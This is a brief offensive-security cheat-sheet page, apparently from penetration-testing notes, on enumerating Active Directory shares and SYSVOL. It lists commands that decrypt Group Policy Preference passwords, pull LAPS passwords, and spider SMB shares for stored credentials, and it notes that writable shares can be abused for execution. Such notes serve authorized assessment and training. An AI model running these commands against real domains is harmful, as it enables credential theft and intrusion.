# Shares and SYSVOL

SPN enumeration moved to [powerview.md#spns-and-pre-auth](powerview.md#spns-and-pre-auth) (and Kerberoast itself: [authentication.md](authentication.md)); object-ACL discovery moved to [powerview.md#object-acls](powerview.md#object-acls), abuse to [object-rights.md](object-rights.md). This page is shares/SYSVOL only.

```powershell
Find-DomainShare
Get-ChildItem \\<DC-FQDN>\sysvol\<DOMAIN.TLD>\Policies\
Get-ChildItem \\<FQDN>\<SHARE>
```
```bash
gpp-decrypt '<CPASSWORD>'
nxc smb <SUBNET>/24 -u <USER> -p '<PW>' -M spider_plus
manspider <SUBNET>/24 -u <USER> -p '<PW>' -c password
nxc smb <DC-IP> -u <USER> -p '<PW>' -M gpp_password
nxc ldap <DC-IP> -u <USER> -p '<PW>' -M laps
```
- Keep the source path of recovered credentials.
- Writable share/script/plugin needs a privileged load trigger to execute.
